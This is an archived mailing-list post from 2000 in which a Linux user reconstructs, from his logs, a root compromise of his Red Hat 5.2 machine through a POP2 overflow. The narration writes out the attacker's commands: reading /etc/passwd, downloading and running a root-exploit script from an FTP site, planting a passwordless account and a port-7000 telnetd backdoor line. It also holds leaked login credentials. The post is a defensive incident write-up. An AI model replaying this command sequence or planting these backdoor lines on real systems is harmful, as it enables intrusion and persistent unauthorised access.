@@ -1,0 +1,692 @@
+<HTML>
+<!-- EmailData="Start" -->
+<!-- Version="1.1" -->
+<!-- Subject="rat was cracked!" -->
+<!-- FromName="Alan Kennington" -->
+<!-- FromEmail="akenning@dog.topology.org" -->
+<!-- ToName="LinuxSA" -->
+<!-- ToEmail="linuxsa@linuxsa.org.au" -->
+<!-- Date="Sun, 10 Sep 2000 01:04:22 +0930" -->
+<!-- Id="20000910010422.A23505@dog.topology.org" -->
+<!-- Reference="" -->
+<!-- X-Face="" -->
+<!-- X-URL="" -->
+<!-- EmailData="End" -->
+<HEAD>
+<TITLE>LinuxSA Mailing List: rat was cracked!</TITLE>
+</HEAD>
+<BODY BGCOLOR=#FFFFFF><H1>LinuxSA Mailing list archives</H1>
+<!-- IndexControl1="Start" -->
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+<HR>
+<!-- IndexControl1="End" -->
+<!-- Header="Start" -->
+<PRE>
+  From: Alan Kennington &lt;<I><A HREF="mailto:akenning@dog.topology.org">akenning@dog.topology.org</A></I>&gt;
+  To  : LinuxSA &lt;<I><A HREF="mailto:linuxsa@linuxsa.org.au">linuxsa@linuxsa.org.au</A></I>&gt;
+  Date: Sun, 10 Sep 2000 01:04:22 +0930
+</PRE>
+<H1>rat was cracked!</H1>
+<!-- Header="End" -->
+<!-- Body="Start" -->
+<PRE>
+Someone cracked my linux 5.2 machine on 5 July 2000!!!!
+
+========================================================
+Very long account of successful hack of a redhat 5.2 machine
+via port 109.
+If you're not into linux security, please go to the next
+e-mail item.
+========================================================
+
+
+Anyone with port 109 open on a red hat machine
+should comment out the 109 line in /etc/inetd/conf
+and execute "killall -HUP inetd" immediately.
+This is the opinion I've come to after realising that
+my old redhat macine "rat" was hacked on 5 July 2000
+(July 4 in the S at that time!!).
+
+I found this line in /etc/passwd (last line):
+
+bob::100:100::/:/bin/bash
+
+I also found this last line in /etc/inetd.conf:
+
+7000 stream tcp nowait root /usr/sbin/tcpd in.telnetd
+
+I don't remember that being there.
+
+Anyway, I looked back over my logs and found the 
+sequence of events leading to the hack.
+It started with a port 109 (POP2) access by
+216.233.33.53 (node-d8e92135.powerinter.net)
+at 10:38 on 4 July 2000.
+This was followed up at 02:33 local time on 5 July 2000
+by the real pop2 hack from 210.205.10.6 (somewhere in Korea):
+
+210.205.10.0-210.205.10.127     (INCOM) INCOM I&C CO. LTD; Jinsung Bldg. 996-1 Daechi-Dong, Kangnam-Ku, Seoul; Seoul; KR
+
+At 02:49 on 5 July 2000, there was a pop2 access from:
+
+213.25.241.20 (pa20.nowysacz.sdi.tpnet.pl).
+
+This access seemed to be cliaming to be the user:
+migux.mig.be:nobody.
+
+Then "rat" initiated an access to port 514 (shell) on 
+migux.mig.be.
+All of these accesses failed with the RST/ACK response.
+
+Then "rat" was caused to try to access port 143 (imap)
+of host migux.mig.be, successfully.
+
+Then there's an exchange of password, authentication etc.
+between "rat" and the Belgian host.
+
+----------------------------------------------
+Question:
+Why on earth is the POP mail software programmed to go off
+and try to log into other machines on ports 514 and 143?
+This doesn't sound like such a good idea to me.
+
+-----------------------------------------------
+Next, at 02:49:51, the Polish user gets a message like:
+
+#0 messages in {migux.mig.be ....
+
+The Polish user then types "FOLD" followed by a large number
+of copies of the byte 0x90.
+The packet length is 1044 bytes.
+An overflow attack, I think.
+
+============================
+Then rat sends the text:
+
+2:49 a.m. up 25 days,  1:42....
+
+============================
+Then the Polish user types:
+
+cat /etc/passwd
+
+And "rat" reponds with the contents of /etc/passwd.
+
+============================
+Polish user types
+
+cd /tmp
+ftp ftp.technotronic.com
+
+============================
+Response at 2:50:34 is:
+
+220-ftp.technotronic.com
+
+============================
+Then the Polish user logs in as anonymous
+with password <A HREF="mailto:azz@tin.it.">azz@tin.it.</A>
+This is relayed by rat to the technotronic site.
+
+This connection gets closed by the technotronic site?
+(I'm not sure about this.)
+
+============================
+The the Polish user types "hash" to my "pop2" client.
+Then "bin".
+Then "cd unix".
+Then "cd linux-exploits".
+Then "cd redhat".
+These seem to be manual, space by 4-5 seconds.
+Then "cd 5.2".
+Then "rootcron.sh".
+Then "exit".
+
+============================
+Then there's a 212-byte packet which starts:
+
+Name (ftp.technotronic.com:n...
+Probably it's:
+
+Name (ftp.technotronic.com:nobody...
+
+Question:
+Does anyone know if this executes a script?
+E.g. the rootcron.sh file?
+
+============================
+Then the Polish user types:
+
+ftp.technotronic.com
+
+Then rat opens an FTP connection to sword.damocles.com.
+The machine responds:
+
+220-sword.damocles.com.FTP.ser....
+
+sword.damocles.com responds that it is disconnecting.
+
+============================
+Then the Polish user types:
+
+ankdsfnkjdsfjkljkl
+
+"rat" relays this to sword.damocles.com:
+
+USER ankdsfnkjdsfjkljkl
+
+"rat" reponds to the Polish user on the pop2 connection:
+
+Name: (technotronic.com:nobody....
+
+============================
+"rat" sends the following on pop2 connection:
+
+POP2 rat.topology.org V4.4
+
+Polish user sends:
+
+HELO migux.mig.be:nobody n0b
+
+===========================
+"rat" initiates connection to migux.mig.be,
+this time successfully, on port "shell" (514).
+
+There's a long sequence of packets with no payload.
+
+================================
+Then rat opens a new connection to the imap2 port of migux.
+There is this response from migux.mig.be at 03:11:32:
+
+* OK migux.mig.be IMAP4rev1
+
+"rat" responds with:
+
+00000000 CAPABILITY
+
+"migux" sends:
+
+* CAPABILITY IMAP4 IMAP4REV1
+
+"rat" sends:
+
+00000001 AUTHENTICATE LOGIN
+
+"migux" sends:
+
++.VXNlciBOYW1lAA==
+
+This looks to me like a password challenge?
+"rat" sends:
+
+bm9ib2R5
+
+migux sends:
+
++.UGFzc3dvcmQA
+
+rat sends:
+
+bjBiMGR5
+
+migux sends:
+
+00000001 OK AUTHENTICATE com....
+
+rat sends:
+
+00000002 SELECT INBOX
+
+migux sends:
+
+* 0 EXISTS 
+* 0 RECENT
+* 0 OKAY
+etc. etc. ....
+
+============================
+Now "rat" sends to the Polish user:
+
+#0 messages in {migux.mig.be....
+
+FOLD 0x90 0x90....
+
+I.e. a lot of 0x90 characters, in a 1044 byte packet.
+I don't know what the rest is.
+
+==============================
+Then "rat" sends to the Polish user on the pop2 connection:
+
+  3:11 am  up 25 days, 2:04....
+
+Polish user types:
+
+cd /ymp
+
+Polish user types:
+
+cd /tmp
+ls
+
+"rat" responds with directory listing.
+
+==============================
+Polish user types
+
+ftp ftp.technotronic.com
+
+Then rat opens connection to ftp.technotronic.com again!!
+
+Question:
+Why does a pop2 session allow the user to open FTP connections?
+Is this normal?
+
+============================
+Polish user logs in as "anonymous" with password "<A HREF="mailto:azz@tin.it">azz@tin.it</A>".
+This is typed over the pop2 connection and relayed over the
+FTP connection to ftp.technotronic.com.
+
+The response from the FTP server is:
+
+You are user #6 of 50 si....
+
+"rat" sends:
+
+SYST
+
+FTP server responds with:
+
+8
+
+Polish user types:
+
+hash
+bin
+
+"rat" sends to FTP server:
+
+TYPE I
+
+FTP server responds with:
+
+200 Type okay
+
+Polish user types:
+
+cd unix
+cd linux-exploits
+cd redhat
+cd 5.2
+get rootcron.sh
+
+Then the file is transferred.
+It starts with:
+
+--------------------------
+#!/bin/sh 
+
+clear
+
+echo '----
+--------------------------
+
+Another chunk of text of this file is:
+
+--------------------------
+....f__
+
+chmod 755 /tmp/vixie-ro....
+--------------------------
+
+The total is about 2490 bytes.
+
+==================================
+Then rat responds to Polish user on pop2 connection with:
+
+# 
+
+Polish user types "exit" on pop2 connection.
+
+===================================
+Polish user types:
+
+chmod +x rootcron.sh
+./rootcron.sh
+
+"rat" responds with:
+
+----------------------------------
+
+I.e. a row of hyphens.
+
+==================================
+Then "rat" sends:
+
+Marchew Hyperreal Industries
+
+Then are lots of empty pop2 packets.
+Or rather, "rat" sends lots of packets
+containing 0x2e (full stop?).
+
+Then rat sends:
+
+ [+] Huh, done. Removing cron....
+
+==================================
+Polish user sends:
+
+whoami
+
+"rat" responds:
+
+nobody
+
+Polish user types:
+
+./rootcron.sh
+
+Exactly the same sequence follows as above.
+But then the Polish user types:
+
+whoami
+
+and "rat" responds:
+
+root
+
+==================================
+Polish user types:
+
+cd ..
+echo bob::100:100::/:/bin/ba....
+
+Obviously this /bin/bash.
+
+Then the Polish user types:
+
+cat /etc/passwd
+
+"rat" responds with the /etc/passwd file.
+
+Then "rat" sends this text over the pop2 connection:
+
+[*] Exploit done.
+
+=================================
+Then the Polish user sends lots of telnet SYN packets!
+And then a SYN packet to port 7000.
+(This was added to the inetd.conf file, remember!)
+But the 7000 port connection is refused: RST/ACK.
+
+==================================
+Then the Polish user opens a new pop2 connection.
+Polish user sends HELO migux.mig.be:nobody again.
+Then "rat" goes through trying to connect to
+migux.mig.be on rsh-port again, fails, and then
+tries the IMAP2 port.
+
+The same long sequence then happens again as above,
+and the Polish user again sends:
+
+FOLD 0x90 0x90....
+
+I.e. binary 0x90 characters in a big packet.
+
+Then Polish user sends:
+
+cd /tmp
+ftp shouten.members......
+
+Then a bit later, Polish user types:
+
+shouten
+
+Then rat sends a SYN packet to the FTP port of 
+IP host 216.167.96.108.
+
+This host replies with SYN/ACK.
+Polish user types:
+
+shouten
+
+Then host 216.167.96.108 opens a connection to rat's "auth" port.
+It then sends:
+
+5940, 21
+
+Coincidentally, 5940 is the port that rat used to call the
+216.167.96.108 port 21 with.
+
+"rat" responds with:
+
+5940 , 21 : USERID : OTHER : ....
+
+===================================
+The Polish user then sends:
+
+RWknnUhqW
+
+Then the host 216.167.96.108 sends:
+
+220 ProFTPD1.2.0pre10 Serve....
+
+"rat" sends:
+
+USER shouten
+
+Password is sent:
+
+RWknnUhqW
+
+Response from FTP server is:
+
+500 PASSWORD: PASS not underst.....
+
+"rat" then sends to the Polish user on the pop2 link:
+
+Name (shouten.members.easysp ....
+Login failed
+
+Then there's more stuff that's not too different to before,
+followed by this from the Polish user:
+
+PASS RWknUhqW
+
+Then what seem to be more typing errors.
+
+This all seems to peter out and goes quiet.
+
+=======================================================
+=======================================================
+Then at 03:59:47 on the same day,a bout 1.5 hours later,
+there's another pop2 access from:
+
+212.141.81.73 (gw7a60-1-d327.wind.it)
+
+This starts the same:
+
+HELO migux.mig.be:nobody n0b....
+
+The connection to imap2 port of migux happens again.
+
+But this time, after a lot of stuff that looks the same, there's
+this from rat to the Italian user:
+
+System.map
+badger
+bin
+boot
+b....
+
+That just happens to be a listing of my root directory on "rat".
+Then they type:
+
+cd /tmp
+pwd
+ls
+./rootcron.sh
+
+Same response, with dots being displayed to show progress.
+
+Then the same "done" message.
+Then "whoami" followed by "root" response from "rat.
+
+Then the Italian user types:
+
+echo 7000 stream tcp nowait
+
+This obviously caused the mysterious line in my inetd.conf file!!
+
+=======================================================
+Then the Italian user typed
+
+cat /etc/inetd.conf
+
+"rat" displays the contents.
+Then the user types:
+
+cat /etc/passwd
+
+This is typed a second time.
+In fact, it is typed 5 times.
+maybe they were making a copy to run through a password guesser.
+
+Then another user from Italy connects up!!!!!!
+This time it's 
+
+212.141.82.79 (gw7a61-d79.wind.it)
+
+While the second user is logging in to pop2, the first user
+types "cat /etc/passwd" again.
+
+After lots of boring stuff, the second user login
+ now types:
+
+killall -HUP inetd
+ps -aux
+cat /etc/passwd
+killall -HUP inetd
+ps -aux
+cat /etc/passwd
+cat /etc/passwd
+cat /etc/inetd.conf
+cat /etc/passwd
+cd /tmp
+pwd
+cat /etc/passwd
+ftp shouten.members.easyspac
+
+The same login as "shouten" occurs again with
+password = RWknUhqW
+
+This fails.
+
+Then there's more of this from the two logins mixed:
+
+cat /etc/passwd
+cat /etc/passwd
+
+======================================
+Then suddenly there's a telnet attempt to rat from
+ 213.167.205.19, which appears to be in Europe.
+
+But the telnet port is blocked!
+
+Then there's more of....
+
+cat /etc/passwd
+cat /etc/passwd
+cat /etc/passwd
+cat /etc/hosts.deny
+cat /etc/passwd
+cat /etc/hosts.deny
+cat /etc/hosts.deny
+cat /etc/hosts.deny
+
+I don't really understand all this stuff!!
+
+Bingo!!!!!!!!!!
+I just checked my logs.
+At about 4:15, I changed my firewall to stop port 109.
+So until 4:30 (the time of the above stuff), all of these
+packets were just CP re-transmissions.
+
+It's a jolly good thing I was up at that time and was
+alert enough to block all that stuff!!!!!!!
+
+At 08:59:53, same day, along came a repeat attempt
+by 212.141.80.20 (gw7a60-1-d20.wind.it) on the pop2 port.
+But this time - no problem.
+The firewall stopped them.
+
+===================================================
+===================================================
+
+Clearly if I hadn't been awake at 4:15 a.m. on 5 July 2000,
+my machine could have suffered much more.
+
+I think I will now go round an tighten up all the security.
+Maybe I'll buy a new firewall machine, and fit it out with
+much more secure stuff.
+
+===================================================
+
+Moral of story:
+
+I think that Mark Newton was right.
+The .rhosts thing is very bad.
+These hackers could have broken into all of my computers
+from one computer.
+
+Trouble is, though, that "ssh" lets root read the sh password
+in clear from a unix port.
+So that's very bad too!!!
+
+Cheers,
+Alan Kennington.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- 
+LinuxSA WWW: <A HREF="http://www.linuxsa.org.au/">http://www.linuxsa.org.au/</A>  IRC: #linuxsa on irc.linux.org.au
+To unsubscribe from the LinuxSA list:
+  mail <A HREF="mailto:linuxsa-request@linuxsa.org.au">linuxsa-request@linuxsa.org.au</A> with "unsubscribe" as the subject
+
+</PRE>
+<!-- Body="End" -->
+<!-- IndexControl2="Start" -->
+<HR>
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+<!-- IndexControl2="End" -->
+<HR><FONT SIZE=+1>Return to the <A HREF=/mailing-list/>LinuxSA Mailing List Information</A> Page</FONT></BODY>
+</HTML>
